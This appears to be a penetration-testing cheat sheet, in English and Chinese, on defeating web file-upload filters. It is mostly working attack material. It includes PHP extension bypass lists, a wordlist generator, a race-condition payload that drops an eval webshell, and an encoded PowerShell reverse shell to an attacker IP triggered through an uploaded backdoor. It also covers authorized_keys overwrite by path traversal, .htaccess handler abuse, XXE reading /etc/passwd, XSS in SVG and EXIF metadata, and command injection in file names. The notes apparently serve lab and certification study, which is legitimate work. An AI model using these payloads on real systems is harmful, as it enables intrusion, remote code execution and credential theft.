### File Extensions
need to use echo "hello" to determine which extension can execute code
```
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.inc
.phps
.phP
.Php
.PHp
.pHP
```
For Windows
```
test.jsp.
```
### Character Injection
```
%20
%0a
%00
%0d0a
/
.\
.
…
:
```
```
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
### 条件竞争绕过
服务器对文件进行检测，如果不符合则删除文件，这其中需要一些时间，我们可以利用这个时间差进行上传木马，要求服务器接收到文件不会重命名。
我们将上传的文件写为：
```
<?php fputs(fopen('shell.php','w'),'<?php eval($_GET[cmd])?>');?>
```
### 文件类型特征码（Convert to ascii in burp）
https://en.wikipedia.org/wiki/List_of_file_signatures  
Put the corresponding file signature code in front of the file content in burp 
```
JPEG (jpg)，文件头：FFD8FF
PNG (png)，文件头：89504E47
GIF (gif)，文件头：47494638
TIFF (tif)，文件头：49492A00
Windows Bitmap (bmp)，文件头：424D
CAD (dwg)，文件头：41433130
Adobe Photoshop (psd)，文件头：38425053
Rich Text Format (rtf)，文件头：7B5C727466
XML (xml)，文件头：3C3F786D6C
HTML (html)，文件头：68746D6C3E
Email [thorough only] (eml)，文件头：44656C69766572792D646174653A
Outlook Express (dbx)，文件头：CFAD12FEC5FD746F
Outlook (pst)，文件头：2142444E
MS Word/Excel (xls.or.doc)，文件头：D0CF11E0
MS Access (mdb)，文件头：5374616E64617264204A
WordPerfect (wpd)，文件头：FF575043
Postscript (eps.or.ps)，文件头：252150532D41646F6265
Adobe Acrobat (pdf)，文件头：255044462D312E
Quicken (qdf)，文件头：AC9EBD8F
Windows Password (pwl)，文件头：E3828596
ZIP Archive (zip)，文件头：504B0304
RAR Archive (rar)，文件头：52617221
Wave (wav)，文件头：57415645
AVI (avi)，文件头：41564920
Real Audio (ram)，文件头：2E7261FD
Real Media (rm)，文件头：2E524D46
MPEG (mpg)，文件头：000001BA
MPEG (mpg)，文件头：000001B3
Quicktime (mov)，文件头：6D6F6F76
Windows Media (asf)，文件头：3026B2758E66CF11
MIDI (mid)，文件头：4D546864
```
### Powershell reverse shell
```
kali: pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20(replaced by $EncodedText)
```

### If can't execute uploaded file, try overwriting file
```
ssh-keygen
filename: fileup
cat fileup > authorized_keys
upload ../../../../../../../root/.ssh/authorized_keys
rm ~/.ssh/known_hosts
ssh -p 2222 -i privatekey root@mountaindesserts.com
```
### Webshell
https://github.com/WhiteWinterWolf/wwwolf-php-webshell
### Upload .htaccess to rce
Blue teamers and developers are usually quick to blacklist file extensions, but rarely consider how webserver configuration files themselves can be exploited. Hence why the .htaccess technique can be so dangerous, even leading to RCE.

This file isn't directly an RCE vector, but it does allow for the definition of new valid PHP extensions, which can then be uploaded to the server (as they are not blacklisted).

An example .htaccess file that can be used to add a new PHP extension is:  
cat .htaccess 
```
AddType application/x-httpd-php .evil
```
Note that this attack relies on the following options being enabled, and NGINX does not support .htaccess files.
```
/etc/apache2/apache2.conf:      AllowOverride Options
/etc/apache2/apache2.conf:      AllowOverride FileInfo
```
Upload webshell.evil, then access webshell.evil
### ODT file upload to get hash
CVE-2018-10583
```
python3 CVE-2018-10583.py >> bad.odt
Upload bad.odt 
sudo responder -I tun0 -A 
```
### Factor which determines code execution of php
```
/etc/apache2/mods-enabled/php7.4.conf for the Apache2 web server:

<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```
### XML payload
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe "XXE_PARSER_TEST_7F21">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
### Stored XSS via metadata
```
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```
### Injections in File Name
```
file$(whoami).jpg or file`whoami`.jpg or file.jpg||whoami  
<script>alert(window.origin);</script>  
file';select+sleep(5);--.jpg
```
### Upload Directory Disclosure
>In such cases, we may utilize fuzzing to look for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE) to find where the uploaded files are by reading the web applications source code, as we saw in the previous section. Furthermore, the Web Attacks/IDOR module discusses various methods of finding where files may be stored and identifying the file naming scheme.

>Another method we can use to disclose the uploads directory is through forcing error messages, as they often reveal helpful information for further exploitation. One attack we can use to cause such errors is uploading a file with a name that already exists or sending two identical requests simultaneously. This may lead the web server to show an error that it could not write the file, which may disclose the uploads directory. We may also try uploading a file with an overly long name (e.g., 5,000 characters). If the web application does not handle this correctly, it may also error out and disclose the upload directory.
